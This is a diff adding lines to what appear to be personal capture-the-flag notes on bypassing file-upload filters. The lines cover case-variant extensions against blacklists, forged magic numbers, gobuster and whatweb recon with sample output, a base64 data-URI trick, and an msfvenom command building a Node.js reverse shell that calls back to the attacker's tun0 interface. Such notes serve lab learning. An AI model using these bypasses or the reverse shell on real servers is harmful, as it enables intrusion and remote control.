@@ -323,3 +323,16 @@ Execute any administrative command
 * pathinfo to get the extension, then a blacklist with a switch. We can pass it easily with values such as PhP pHP... or php5... .phtml... https://en.wikipedia.org/wiki/PHP
 * hexeditor to edit the hex of a file. Write X letters, save, open in hex editor, and replace them with magic number: https://en.wikipedia.org/wiki/List_of_file_signatures
 * writeups
+* Inspect the client side, try using valid files, see where it lands, what's the naming scheme... Test really weird extensions, to see if blacklist or whitelist. Try the geniune file with a malicious magic number, to see what is checked.
+* check the server size filter
+* gobuster check the size of the element found
+* whatweb url
+
+```
+URL [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.196.97], JQuery[3.5.1], Object[image/svg+xml], Script, Title[Jewel], UncommonHeaders[access-control-allow-origin,front-end-https], X-Powered-By[Express], nginx[1.14.0]
+```
+
+* msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4455 -o shell.js
+* `data:text/javascript;base64,` (can append directly)
+* https://blog.cyberethical.me/
+* stat xxx.file
